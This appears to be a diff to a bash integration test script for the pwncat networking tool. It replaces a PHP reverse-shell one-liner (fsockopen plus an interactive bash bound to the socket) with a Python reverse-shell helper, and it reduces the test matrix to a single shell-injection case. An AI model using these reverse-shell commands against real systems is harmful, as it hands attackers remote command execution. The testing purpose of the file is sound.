@@ -25,6 +25,13 @@ PYTHON="python${5:-}"
 PYVER="$( "${PYTHON}" -V 2>&1 | head -1 || true )"
 
 
+BANNER="banner\n"
+PREFIX1=""
+PREFIX2=""
+SUFFIX1="[0] cytopia at hostname in ~/tmp/pwncat (☿ pwncat.git release-0.1.0+)\n"
+SUFFIX2="tmux:>bash> "
+
+
 # -------------------------------------------------------------------------------------------------
 # TEST FUNCTIONS
 # -------------------------------------------------------------------------------------------------
@@ -87,7 +94,7 @@ run_test() {
 	# Start Client
 	print_info "Start Client"
 	# shellcheck disable=SC2086
-	if ! cli_pid="$( run_bg "" "php" -r "\$sock=fsockopen(\"${RHOST}\",${RPORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");" "${cli_stdout}" "${cli_stderr}" )"; then
+	if ! cli_pid="$( run_bg "" "${PYTHON}" ${SCRIPTPATH}/revshell.py ${RHOST} ${RPORT} "${BANNER}" "${PREFIX1}" "${PREFIX2}" "${SUFFIX1}" "${SUFFIX2}" "${cli_stdout}" "${cli_stderr}" )"; then
 		printf ""
 	fi
 
@@ -124,7 +131,7 @@ run_test() {
 	# --------------------------------------------------------------------------------
 	print_h2 "(4/8) Stop: Instances"
 
-	run "kill ${cli_pid} || true"
+	run "kill -9 ${cli_pid} || true"
 	run "kill ${srv_pid} || true"
 
 
@@ -168,6 +175,8 @@ run_test() {
 	print_h2 "(8/8) Cleanup"
 
 	run "ps auxw | grep -v grep | grep reconn-wait | awk '{print \$2}' | xargs kill"
+
+	print_file "SERVER] - [/dev/stdout" "${srv_stdout}"
 }
 
 
@@ -178,28 +187,5 @@ run_test() {
 for curr_round in $(seq "${RUNS}"); do
 	#         server opts            client opts
 	# BIND ON ANY
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh -4 -vvvv"  "2" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh -6 -vvvv"  "3" "16" "${curr_round}" "${RUNS}"
-
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "4" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv" "${RHOST} ${RPORT} -e /bin/sh -4 -vvvv"  "5" "16" "${curr_round}" "${RUNS}"
-
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "6" "16" "${curr_round}" "${RUNS}"
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv" "${RHOST} ${RPORT} -e /bin/sh -6 -vvvv"  "7" "16" "${curr_round}" "${RUNS}"
-	# no verbosity
-	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}         " "${RHOST} ${RPORT} -e /bin/sh         "  "8" "16" "${curr_round}" "${RUNS}"
-
-	## BIND ON SPECIFIC
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"   "9" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv"  "10" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh    -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv"  "11" "16" "${curr_round}" "${RUNS}"
-
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -4 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"  "12" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -4 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -4 -vvvv"  "13" "16" "${curr_round}" "${RUNS}"
-
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -6 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv"  "14" "16" "${curr_round}" "${RUNS}"
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh -6 -vvvv" "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT} -6 -vvvv"  "15" "16" "${curr_round}" "${RUNS}"
-	## no verbosity
-	#run_test "-l ${RHOST} ${RPORT} -e /bin/sh         " "${RHOST} ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}         "  "16" "16" "${curr_round}" "${RUNS}"
+	run_test "-l ${RPORT} --self-inject /bin/sh:${RHOST}:${RPORT}    -vvvv" "${RHOST} ${RPORT} -e /bin/sh    -vvvv"  "1" "1" "${curr_round}" "${RUNS}"
 done
